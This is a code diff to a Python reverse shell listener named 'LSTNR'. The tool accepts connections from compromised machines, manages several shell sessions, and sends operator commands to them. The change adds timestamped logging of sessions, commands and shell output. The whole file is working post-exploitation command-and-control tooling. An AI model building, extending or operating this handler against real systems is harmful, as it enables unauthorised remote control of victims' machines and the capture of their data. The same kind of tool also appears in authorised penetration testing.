@@ -4,7 +4,7 @@ import threading
 import sys
 import queue
 import time
-import re
+import os
 
 # ANSI escape codes for colors
 RED = "\033[91m"
@@ -22,23 +22,43 @@ lock = threading.Lock()
 
 notifications = queue.Queue()  # Queue to store new session messages
 
+# Log file path with timestamp
+LOG_FILE = f"{time.strftime('%Y-%m-%d_%H-%M-%S')}-sessions.log"
+
+# Initialize logging to a file
+def init_log_file():
+    """Initialize the log file by writing a header."""
+    with open(LOG_FILE, 'w') as log_file:
+        log_file.write("LSTNR Log File\n")
+        log_file.write("Start Time: {}\n".format(time.ctime()))
+        log_file.write("="*50 + "\n")
+
+def log_to_file(message):
+    """Log message to the sessions.log file."""
+    with open(LOG_FILE, 'a') as log_file:
+        log_file.write(message + "\n")
+
 def print_error(error_message):
     """Prints errors in red."""
-    print(f"{RED}[!] ERROR: {error_message}{RESET}")
+    message = f"{RED}[!] ERROR: {error_message}{RESET}"
+    print(message)
+    log_to_file(message)  # Log error to the file
 
 def print_commands():
     """Prints a formal list of available commands."""
-    print("\n[+] List of commands:")
-    print("   help | ?  - List this menu")
-    print("   ls        - List active sessions")
-    print("   cs <id>   - Connect to a specific session by ID")
-    print("   bs        - Background the current session")
-    print("   exit      - Terminate the current session or exit the program")
-    print()
+    message = "\n[+] List of commands:\n"
+    message += "   help | ?  - List this menu\n"
+    message += "   ls        - List active sessions\n"
+    message += "   cs <id>   - Connect to a specific session by ID\n"
+    message += "   bs        - Background the current session\n"
+    message += "   exit      - Terminate the current session or exit the program\n"
+    print(message)
+    log_to_file(message)  # Log the command list to the file
 
 def handle_client(client_socket, addr, session_number):
     """Creates a fully interactive reverse shell with real-time output."""
     print(f"[+] Session {session_number} connected from {addr}")
+    log_to_file(f"[+] Session {session_number} connected from {addr}")  # Log session start
 
     stop_event = threading.Event()
 
@@ -53,6 +73,9 @@ def handle_client(client_socket, addr, session_number):
                         break  # Connection closed
                     sys.stdout.write(data.decode(errors="ignore"))  # Print immediately
                     sys.stdout.flush()
+
+                    # Log the command output
+                    log_to_file(data.decode(errors="ignore"))
         except OSError:  # Handle 'Bad file descriptor' error
             pass  
         except Exception as e:
@@ -66,12 +89,18 @@ def handle_client(client_socket, addr, session_number):
         while True:
             command = sys.stdin.readline().strip()  # Read user input properly
 
+            # Log the user input command
+            if command:
+                log_to_file(f"Command: {command}")
+
             if command.lower() == "bs":
                 print(f"[*] Session {session_number} moved to background.")
+                log_to_file(f"[*] Session {session_number} moved to background.")
                 stop_event.set()
                 return
             if command.lower() == "exit":
                 print(f"[-] Terminating session {session_number}.")
+                log_to_file(f"[-] Terminating session {session_number}.")
                 stop_event.set()  # Stop receiving thread
                 recv_thread.join()  # Wait for thread to fully stop
                 try:
@@ -88,11 +117,13 @@ def handle_client(client_socket, addr, session_number):
 
     except KeyboardInterrupt:
         print(f"\n[*] Session {session_number} moved to background.")
+        log_to_file(f"[*] Session {session_number} moved to background.")
         stop_event.set()
         recv_thread.join()
         return
     except BrokenPipeError:
         print(f"[-] Session {session_number} disconnected.")
+        log_to_file(f"[-] Session {session_number} disconnected.")
         stop_event.set()
         recv_thread.join()
         return
@@ -100,6 +131,7 @@ def handle_client(client_socket, addr, session_number):
         print_error(str(e))
 
     print(f"[-] Session {session_number} disconnected.")
+    log_to_file(f"[-] Session {session_number} disconnected.")  # Log session disconnection
     with lock:
         del sessions[session_number]
 
@@ -113,6 +145,10 @@ def session_manager():
                 print(notifications.get())
 
             command = input(f"{BLUE}LSTNR$ {RESET}").strip()
+            
+            # Log the command input
+            log_to_file(f"LSTNR$ {command}")
+            
             if command == "":
                 print_commands()
             elif command == "help":
@@ -129,6 +165,7 @@ def session_manager():
                 for sid, session in sessions.items():
                     print(f"| {sid:<3} | {session['addr'][0]:<15} |")
                 print("+-----------------------+\n")
+                log_to_file("Session list displayed.")
             elif command.startswith("cs "):
                 try:
                     sid = int(command.split()[1])
@@ -140,15 +177,18 @@ def session_manager():
                     print_error("Invalid command. Usage: cs <session_id>")
             elif command.lower() == "die":
                 print("[-] Terminating all sessions...")
+                log_to_file("[-] Terminating all sessions...")
                 with lock:
                     for sid in list(sessions.keys()):
                         sessions[sid]["socket"].send(b"exit\n")
                         sessions[sid]["socket"].close()
                         del sessions[sid]
                 print("[+] All sessions terminated.")
+                log_to_file("[+] All sessions terminated.")
             elif command.lower() == "exit":
                 print("Killing all sessions.")
                 print("Shutting down LSTNR.")
+                log_to_file("Killing all sessions. Shutting down LSTNR.")
                 break
             else:
                 print_error("Unknown command. Use 'ls', 'cs <id>', 'bs', 'exit', or 'die'.")
@@ -183,7 +223,8 @@ def start_listener():
     - MADE FOR REVERSE SHELL MANAGEMENT
     """)
     print(f"[*] Listening on {HOST}:{PORT}")
-    
+    log_to_file(f"[*] Listening on {HOST}:{PORT}")
+
     while True:
         try:
             client_socket, addr = server.accept()
@@ -191,6 +232,7 @@ def start_listener():
                 session_id += 1
                 sessions[session_id] = {"socket": client_socket, "addr": addr}
             notifications.put(f"{GREEN}[+] New connection from {addr}. Assigned Session ID: {session_id}{RESET}")
+            log_to_file(f"[+] New connection from {addr}. Assigned Session ID: {session_id}")
         except Exception as e:
             print_error(str(e))
 
@@ -208,6 +250,7 @@ if __name__ == "__main__":
         sys.exit(1)
 
     try:
+        init_log_file()  # Initialize the log file with timestamped name
         listener_thread = threading.Thread(target=start_listener, daemon=True)
         listener_thread.start()
 
@@ -223,5 +266,4 @@ if __name__ == "__main__":
         sys.exit(0)
     except Exception as e:
         print_error(str(e))
-                           
-                    
+                          
